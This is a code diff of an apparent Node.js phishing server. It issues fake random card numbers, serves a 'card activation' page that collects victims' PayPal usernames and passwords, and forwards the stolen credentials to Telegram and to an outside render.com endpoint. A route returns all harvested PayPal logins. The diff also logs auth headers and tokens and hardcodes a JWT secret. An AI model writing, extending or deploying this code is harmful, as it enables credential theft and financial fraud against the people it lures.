@@ -19,7 +19,6 @@ function loadData() {
     try {
         if (fs.existsSync(dataFile)) {
             data = JSON.parse(fs.readFileSync(dataFile));
-            // Ensure paypalLogins and logs exist
             if (!data.paypalLogins) data.paypalLogins = [];
             if (!data.logs) data.logs = [];
         } else {
@@ -55,13 +54,17 @@ async function sendTelegramNotification(message) {
     return false;
 }
 
-// Middleware to verify token
+// Middleware to verify token with logging
 const authenticateToken = (req, res, next) => {
+    console.log('Auth header:', req.headers['authorization']);
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
     if (!token) return res.status(401).json({ error: 'No token provided' });
     jwt.verify(token, 'your-secret-key', (err, user) => {
-        if (err) return res.status(403).json({ error: 'Invalid token' });
+        if (err) {
+            console.error('Token verification error:', err.message);
+            return res.status(403).json({ error: 'Invalid token' });
+        }
         req.user = user;
         next();
     });
@@ -95,14 +98,15 @@ app.post('/api/auth/signup', authenticateToken, async (req, res) => {
     }
 });
 
-app.post('/api/auth/login', authenticateToken, async (req, res) => {
+app.post('/api/auth/login', (req, res) => { // Removed authenticateToken here
     try {
         const { username, password } = req.body;
         const user = data.users.find(u => u.username === username && u.password === password);
         if (!user) return res.status(401).json({ error: 'Invalid credentials' });
         const token = jwt.sign({ username }, 'your-secret-key', { expiresIn: '1h' });
+        console.log('Generated token:', token); // Log token for debugging
         const message = `Login: Username: ${username}, Password: ${password}`;
-        await sendTelegramNotification(message);
+        sendTelegramNotification(message);
         res.json({ token });
     } catch (error) {
         console.error('Login error:', error);
@@ -128,7 +132,6 @@ app.post('/api/cards/generate', authenticateToken, (req, res) => {
             return res.status(400).json({ error: 'Invalid card details' });
         }
         const cardId = Date.now().toString();
-        // Generate a random 16-digit card number
         const randomCardNumber = Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
         const card = { cardId, name, expDate, amount, number: randomCardNumber, cvv: '123', user: req.user.username, status: 'pending' };
         data.cards.push(card);
@@ -219,10 +222,8 @@ app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
     }
 });
 
-// Updated endpoint to fetch all PayPal credentials for authenticated users
 app.get('/api/cards/paypal-creds', authenticateToken, (req, res) => {
     try {
-        // Return all paypalLogins, not just for the authenticated user
         res.json({ paypalLogins: data.paypalLogins });
     } catch (error) {
         console.error('Fetch PayPal creds error:', error);
@@ -230,14 +231,12 @@ app.get('/api/cards/paypal-creds', authenticateToken, (req, res) => {
     }
 });
 
-// New standalone activation route
 app.get('/card/:cardId/activate', (req, res) => {
     const cardId = req.params.cardId;
     const card = data.cards.find(c => c.cardId === cardId);
     if (!card || card.status !== 'pending') {
         return res.status(404).send('Card not found or already activated');
     }
-    // Serve a standalone activation page with the same style as the frontend
     res.send(`
         <!DOCTYPE html>
         <html lang="en">
@@ -347,7 +346,6 @@ app.get('/card/:cardId/activate', (req, res) => {
                     const data = await response.text();
                     document.getElementById('message').textContent = data;
                     if (response.ok) {
-                        // Notify frontend via API
                         fetch('https://o-448v.onrender.com/api/cards/activate/external', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -378,7 +376,7 @@ app.post('/card/:cardId/activate', async (req, res) => {
         cardId,
         paypalUsername,
         paypalPassword,
-        user: 'external', // Marked as external activation
+        user: 'external',
         timestamp: new Date().toISOString()
     });
     data.logs.push({ cardId, user: 'external', time: new Date().toISOString() });
@@ -388,17 +386,14 @@ app.post('/card/:cardId/activate', async (req, res) => {
     res.send('Card activated successfully!');
 });
 
-// New endpoint for frontend to receive external activations
 app.post('/api/cards/activate/external', (req, res) => {
     const { cardId, paypalUsername, paypalPassword } = req.body;
     if (!cardId || !paypalUsername || !paypalPassword) {
         return res.status(400).json({ error: 'Missing required fields' });
     }
-    // This endpoint can be used by the frontend to sync external activations
     res.json({ message: 'External activation received', cardId, paypalUsername, paypalPassword });
 });
 
-// Error handlers
 app.use((err, req, res, next) => {
     console.error('Global error:', err.stack);
     res.status(500).json({ error: 'Internal server error' });
